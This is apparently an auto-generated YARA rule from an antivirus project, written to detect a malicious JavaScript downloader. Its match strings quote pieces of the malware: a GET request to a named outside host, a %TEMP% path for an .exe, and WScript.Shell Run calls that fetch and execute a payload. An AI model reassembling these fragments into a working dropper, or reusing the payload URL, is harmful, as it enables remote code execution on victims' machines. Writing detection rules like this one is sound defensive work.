rule sig_20160329_6052ba333ae8267303260e382972c085 {
  meta:
    description = "datamaliciousorder - file 20160329_6052ba333ae8267303260e382972c085.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "91922d72bc416504254b81f1b08dccce6fd70877097098ded5da3e454de1dfc8"

  strings:
    $s1  = "function K() {return O0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ypdqD088Lb.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[h0](h() * 11); if (al[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function yn(h1, W0){kc = kc * 1; return h1 - W0;};" fullword ascii
    $s4  = "al[c](\"GET\", \"http://cngfloristsundries.co.uk/mo4erp\", false);" fullword ascii
    $s5  = "var O0 = function uO() {return WScript[Yd](\"WScript.Shell\");}(), K0 = 11;" fullword ascii
    $s6  = "function M(){return \"\" + pQ;};" fullword ascii
    $s7  = "function R(fi){O0[\"Run\"](fi, kc, kc);};" fullword ascii
    $s8  = "function J() {return ((ru == true) && (ru == dF)) ? 1 : kc;};" fullword ascii
    $s9  = "function GB(){return Yd;};" fullword ascii
    $s10 = "var yr = new this[\"Date\"]();" fullword ascii
    $s11 = " while (wl){" fullword ascii
    $s12 = "function Bd()" fullword ascii
    $s13 = "function h(){return 22;};" fullword ascii
    $s14 = "function u(hj) {var Wg = (1, 2, 3, 4, 5, hj); return Wg;};" fullword ascii
    $s15 = "return yn(dr, kC);" fullword ascii
    $s16 = "ru = true; " fullword ascii
    $s17 = "var dF = false;" fullword ascii
    $s18 = "var ru = false;" fullword ascii
    $s19 = "dF = true; " fullword ascii
    $s20 = "} catch(hb){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}